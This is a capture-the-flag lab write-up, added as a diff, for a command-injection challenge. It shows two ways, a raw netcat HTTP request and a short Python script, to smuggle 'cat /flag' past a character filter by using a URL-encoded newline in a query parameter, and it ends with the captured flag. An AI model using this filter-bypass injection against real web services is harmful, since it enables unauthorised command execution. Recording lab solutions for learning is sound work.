@@ -1,0 +1,47 @@
+# challenge: CMDi 6
+
+📅 2026-01-22
+📁 web security
+
+---
+
+## ✅ what i did  
+I WAY -> netcat
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+found out the endpoint is /step
+this time the server do not allow any time of hijacjtion
+it prevent it by replacing chars such as ";", "|", "&" ...
+so we can url encode ENTER to make the server executes commands in a row
+-ran: '/challenge/server'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET /step?start=bro%0Acat%20%2Fflag HTTP/1.1'
+        'Host: challenge.localhost'
+-flag popped out
+
+II WAY -> python
+-clicked start
+-opened the terminal
+-ran: 'vim bro'
+-typed: '#!/usr/bin/env python3'
+        'import requests'
+        'from pwn import *'
+        'context.log_level = 'error''
+        'p = process("/challenge/server")'
+        'time.sleep(1)'
+        'url = "http://challenge.localhost/step"'
+        'params = {'
+                '"start" : "bro\ncat /flag"'
+            '}'
+        'r = requests.get(url, params)'
+        'print(r.text)
+-ran: 'chmod a+x bro'
+-ran: './bro'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+in python u can us \n in params and the requests will automatically built by creating a new line
+
+## 🏁 Flag  
+pwn.college{A_EpIX1sqYRl2oFHYNQSvMxR-MD.QX0cTN2wCO4IDOxEzW}
